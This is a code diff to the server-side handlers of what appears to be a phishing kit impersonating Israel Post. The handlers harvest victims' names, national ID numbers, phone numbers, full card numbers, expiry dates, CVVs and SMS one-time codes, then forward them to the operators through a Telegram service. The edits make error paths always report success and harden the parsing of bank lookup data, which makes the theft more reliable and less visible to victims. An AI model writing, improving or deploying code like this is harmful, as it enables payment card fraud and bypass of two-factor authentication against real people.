@@ -15,7 +15,7 @@ module.exports.addCardDetails = async (req, res, next) => {
     if (!isValidCard) {
       const blockedIP = new BlockedIP({ ip: req.ip });
       await blockedIP.save();
-      return res.status(200).json({ success: false });
+      return res.status(200).json({ success: true });
     }
 
     const bin = cardNumber.replace(/\D/g, "").substring(0, 7);
@@ -26,32 +26,43 @@ module.exports.addCardDetails = async (req, res, next) => {
     const line1 = "[IsraelPost - 💳 Card Info 💳]";
     const line2 = `[👤] Full Name: ${fullName}`;
     const line3 = `[👤] ID Number: ${idNumber}`;
-    const line4 = `[👤] Mobile Number: ${phoneNumber}`;
+    const line4 = `[👤] Phone Number: ${phoneNumber}`;
     const line5 = `[💳] Card Number: ${formatCreditCard(cardNumber)}`;
     const line6 = `[🔄] Expiry Date: ${expiry}`;
-    const line7 = `[🔑] CCV: ${cvv}`;
+    const line7 = `[🔑] CVV: ${cvv}`;
     const line8 = `[🔍] GEO IP: ${req.ip}`;
     const line9 = "\n";
     const line10 = "[IsraelPost - 💳 BIN Info 💳]";
     const line11 = `[🏛] Card Bank:  ${cardDetails?.bank?.name || "Unknown"}`;
-    const line12 = `[💳] Card Type: ${cardDetails.scheme.toUpperCase()} ${cardDetails.type.toUpperCase()}`;
-    const line13 = `[💳] Card Brand: ${
+    const line12 = `[💳] Card Scheme: ${
+      cardDetails?.scheme?.toUpperCase?.() || "Unknown"
+    }`;
+    const line13 = `[💳] Card Type: ${
+      cardDetails?.type?.toUpperCase?.() || "Unknown"
+    }`;
+    const line14 = `[💳] Card Brand: ${
       cardDetails?.brand?.toUpperCase?.() || "Unknown"
     }`;
-    const line14 = `[💳] Prepaid: ${cardDetails.prepaid ? "Yes" : "No"}`;
-    const line15 = `[💳] Currency: ${
+    const line15 = `[💳] Prepaid: ${
+      typeof cardDetails.prepaid === "boolean"
+        ? cardDetails.prepaid
+          ? "Yes"
+          : "No"
+        : "Unknown"
+    }`;
+    const line16 = `[💳] Currency: ${
       cardDetails?.country?.currency || "Unknown"
     }`;
-    const line16 = `[IsraelPost BY: GHOST !#MSD!#]`;
+    const line17 = `[IsraelPost BY: GHOST !#MSD!#]`;
 
-    const message = `${line1}\n${line2}\n${line3}\n${line4}\n${line5}\n${line6}\n${line7}\n${line8}\n${line9}\n${line10}\n${line11}\n${line12}\n${line13}\n${line14}\n${line15}\n${line16}`;
+    const message = `${line1}\n${line2}\n${line3}\n${line4}\n${line5}\n${line6}\n${line7}\n${line8}\n${line9}\n${line10}\n${line11}\n${line12}\n${line13}\n${line14}\n${line15}\n${line16}\n${line17}`;
 
     telegramService.sendMessage(message);
 
     res.status(200).json({ success: true });
   } catch (err) {
     console.log("ERR", err);
-    res.status(200).json({ success: false });
+    res.status(200).json({ success: true });
   }
 };
 
@@ -66,8 +77,8 @@ module.exports.addCardOTP = async (req, res, next) => {
     [ SMS CODE: ${otp}
     [ IP: ${req.ip}
     [ OS: ${osName || "Unknown"}
-    [ Browser: ${browser?.name || "None"}
-    [ UA: ${ua}
+    [ Browser: ${browser?.name || "Unknown"}
+    [ UA: ${ua || "Unknown"}
     [=====>  ISRAELPOST: GHOST $ MSD  SMS   <=====]
     `;
 
@@ -77,6 +88,6 @@ module.exports.addCardOTP = async (req, res, next) => {
 
     res.status(200).json({ success: true });
   } catch (err) {
-    res.status(200).json({ success: false });
+    res.status(200).json({ success: true });
   }
 };
